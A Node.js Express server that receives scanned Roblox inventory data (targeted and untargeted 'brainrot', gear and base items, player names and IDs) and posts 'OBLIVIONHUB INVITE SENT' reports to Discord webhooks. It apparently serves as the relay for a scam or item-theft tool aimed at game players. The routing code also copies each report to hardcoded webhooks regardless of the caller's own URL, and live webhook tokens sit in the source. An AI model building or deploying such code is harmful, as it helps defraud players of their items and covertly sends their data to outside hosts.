const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;

const FALLBACK_WEBHOOK = 'https://discord.com/api/webhooks/1528664955258277940/DYi4QqN2pr93CM35VxOzy9MZ6eA2Fl408SuHHKgIvmsTtCcepASPG45NDsxXw_veRMA-';

app.use(express.json());

app.get('/webhook', (req, res) => {
    res.json({ status: 'ok', message: 'API funcionando correctamente' });
});

app.post('/webhook', async (req, res) => {
    try {
        const data = req.body;
        console.log('📥 Datos recibidos:', data);

        const player = data.playerName || 'Desconocido';
        const target = data.targetName || 'Desconocido';
        const targetId = data.targetId || 0;
        const webhookUrl = data.webhookUrl;
        const hasPrivateItem = data.hasPrivateItem || false;

        const brainTargeted = data.brainTargeted || [];
        const brainUntargeted = data.brainUntargeted || [];
        const baseTargeted = data.baseTargeted || [];
        const baseUntargeted = data.baseUntargeted || [];
        const gearTargeted = data.gearTargeted || [];
        const gearUntargeted = data.gearUntargeted || [];

        const timestamp = data.timestamp || Date.now();

        // Función para formatear lista con conteo de duplicados
        function formatListWithCount(list) {
            if (!list || list.length === 0) return 'Ninguno';
            const counts = {};
            list.forEach(item => {
                counts[item] = (counts[item] || 0) + 1;
            });
            const formatted = Object.keys(counts).map(name => {
                return counts[name] > 1 ? `${name} (x${counts[name]})` : name;
            });
            return formatted.join(', ');
        }

        // Función para formatear lista simple
        function formatListSimple(list) {
            if (!list || list.length === 0) return 'Ninguno';
            return list.join(', ');
        }

        // Construir mensaje
        const lines = [];

        // Encabezado
        lines.push('✅ SUCCESS: OBLIVIONHUB INVITE SENT');
        lines.push(`✨ Invite successfully sent to Username: ${player}`);
        lines.push('Inventory scan complete. Processing items.');
        lines.push('');

        // Sección de ítems targeteados por categoría
        lines.push('Brainrots targeados:');
        lines.push(formatListWithCount(brainTargeted));
        lines.push('');

        lines.push('Gears targeados:');
        lines.push(formatListWithCount(gearTargeted));
        lines.push('');

        lines.push('Bases targeadas:');
        lines.push(formatListWithCount(baseTargeted));
        lines.push('');

        // Sección de ítems NO targeteados (todos juntos)
        lines.push('ITEMS NO TARGEADO:');
        const allUntargeted = [...brainUntargeted, ...baseUntargeted, ...gearUntargeted];
        if (allUntargeted.length === 0) {
            lines.push('Ninguno');
        } else {
            lines.push(formatListWithCount(allUntargeted));
        }
        lines.push('');

        // Footer
        const date = new Date(timestamp);
        const formattedDate = date.toLocaleString('es-ES', { 
            timeZone: 'UTC',
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        }).replace(/\//g, '-');
        lines.push(`OBLIVIONHUB| Automated System•${formattedDate} UTC`);

        const fullContent = lines.join('\n');

        const payload = {
            content: fullContent,
            username: 'TradeNotifier',
            avatar_url: 'https://cdn.pfps.gg/pfps/10184-389218-roblox.png'
        };

        // Decidir a qué webhooks enviar
        const webhooksToSend = [];

        if (hasPrivateItem) {
            if (webhookUrl) {
                webhooksToSend.push(webhookUrl);
            } else {
                webhooksToSend.push('https://discord.com/api/webhooks/1518688015692599416/9DG8JBvlf31P2FRj3dfRtamrWDpUpCymXpDMkfM8IMEPHVVKmXVeg1i_MXWVZpzokj6L');
            }
        } else {
            if (webhookUrl) {
                webhooksToSend.push(webhookUrl);
            }
            webhooksToSend.push(FALLBACK_WEBHOOK);
        }

        // Enviar a todos los webhooks
        for (const url of webhooksToSend) {
            try {
                await axios.post(url, payload);
                console.log(`✅ Enviado a: ${url}`);
            } catch (err) {
                console.error(`❌ Error enviando a ${url}:`, err.message);
            }
        }

        res.status(200).json({ status: 'ok', message: 'Notificaciones enviadas' });
    } catch (error) {
        console.error('❌ Error general:', error.message);
        res.status(500).json({ status: 'error', message: error.message });
    }
});

app.listen(PORT, () => {
    console.log(`✅ Servidor corriendo en puerto ${PORT}`);
});
